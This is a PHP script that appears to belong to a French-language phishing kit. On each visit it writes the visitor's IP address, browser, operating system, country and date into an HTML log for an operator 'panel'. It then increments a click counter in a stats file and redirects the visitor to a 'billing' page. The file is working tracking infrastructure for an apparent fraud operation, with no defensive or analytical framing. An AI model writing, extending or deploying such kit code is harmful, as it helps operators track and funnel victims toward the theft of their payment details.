<?php 
    include("common/includes.php");
    include("panel/funcs.php");

    setlocale(LC_TIME, 'fr_FR');
    date_default_timezone_set('Europe/Paris');

    $date = date("d/m/Y");
    $heure = date("H:i:s");

    $myfile = fopen("./panel/click.txt", "a") or die("Unable to open file!");
    fwrite($myfile, "\n" . '
    <tr>
    <td width="80"><p align="center">'.$_SERVER['REMOTE_ADDR'].'</th>
    <td width="80"><p align="center">'.getBrowser($USER_AGENT).'</th>
    <td width="80"><p align="center">'.getOs($_SERVER['HTTP_USER_AGENT']).'</th>
    <td width="80"><p align="center">'.$country.'</th>
    <td width="80"><p align="center">'.$date.'</th></th>
    </tr>
    ');
    fclose($myfile);

    $filepath = './panel/stats.ini';
    $data = @parse_ini_file($filepath);
    $data['cliques']++;
                function update_ini_file($data, $filepath) {
                $content = "";
                $parsed_ini = parse_ini_file($filepath, true);
                foreach($data as $section => $values){
                    if($section === ""){
                    continue;
                    }
                    $content .= $section ."=". $values . "\n\r";
                }
                if (!$handle = fopen($filepath, 'w')) {
                    return false;
                }
                $success = fwrite($handle, $content);
                fclose($handle);
                }
    update_ini_file($data, $filepath);  

    header('location: ./pages/billing.php');
?>